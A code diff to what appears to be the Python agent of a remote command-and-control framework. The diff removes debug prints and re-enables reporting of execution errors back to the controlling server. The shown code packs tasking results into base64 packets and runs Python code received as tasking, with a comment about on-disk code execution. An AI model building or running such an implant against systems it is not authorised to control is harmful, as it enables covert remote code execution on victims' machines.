@@ -21,7 +21,6 @@ import math
 import stat
 import grp
 import numbers
-from io import BytesIO
 from os.path import expanduser
 from io import StringIO
 from threading import Thread
@@ -134,16 +133,13 @@ def build_response_packet(taskingID, packetData, resultID=0):
         |  2   |         2          |    2     |    2    |   4    | <Length>  |
         +------+--------------------+----------+---------+--------+-----------+
     """
-    print("build resp packet")
     packetType = struct.pack('=H', taskingID)
     totalPacket = struct.pack('=H', 1)
     packetNum = struct.pack('=H', 1)
     resultID = struct.pack('=H', resultID)
 
     if packetData:
-        print("packet data")
         if(isinstance(packetData, str)):
-            print("string")
             packetData = base64.b64encode(packetData.encode('utf-8', 'ignore'))
         else:
             packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
@@ -153,7 +149,6 @@ def build_response_packet(taskingID, packetData, resultID=0):
         length = struct.pack('=L',len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
-        print("no packet data")
         length = struct.pack('=L', 0)
         return packetType + totalPacket + packetNum + resultID + length
 
@@ -398,9 +393,6 @@ def process_packet(packetType, data, resultID):
         prefix = data[0:15].strip()
         extension = data[15:20].strip()
         data = data[20:]
-        print(prefix)
-        print(extension)
-        print(data)
         try:
             buffer = StringIO()
             sys.stdout = buffer
@@ -417,8 +409,7 @@ def process_packet(packetType, data, resultID):
         except Exception as e:
             # Also return partial code that has been executed
             errorData = str(buffer.getvalue())
-            print(e)
-            #send_message(build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID))
+            send_message(build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID))
 
     elif packetType == 102:
         # on disk code execution for modules that require multiprocessing not supported by exec
